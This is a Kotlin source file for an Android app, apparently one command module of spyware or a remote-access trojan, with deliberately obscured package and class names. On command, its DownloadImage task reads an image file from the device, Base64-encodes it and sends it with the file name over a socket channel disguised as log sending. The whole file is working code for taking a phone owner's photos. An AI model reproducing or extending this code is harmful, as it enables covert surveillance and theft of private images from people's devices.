package com.xxx.zzz.commandp.taskssv

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.util.Base64
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream

class DownloadImage(ctx: Context, private val path: String) : BaseTask(ctx) {

    private fun downloadImage(path: String) {
        runCatching {
            val data = JSONObject()
            data.put("name", File(path).name)
            data.put("image64", encodeImage(path))

            IOSocketyt.sendLogs("", Gsonq().toJson(data), "downloadImage")
        }.onFailure {
            IOSocketyt.sendLogs("", "DownloadImage ${it.localizedMessage}", "error")
        }
    }

    private fun encodeImage(path: String): String {
        val imageFile = File(path)
        val fis = FileInputStream(imageFile)

        val bm = BitmapFactory.decodeStream(fis)
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos)
        val b = baos.toByteArray()
        return Base64.encodeToString(b, Base64.DEFAULT)
    }

    override fun run() {
        super.run()

        downloadImage(path)
    }
}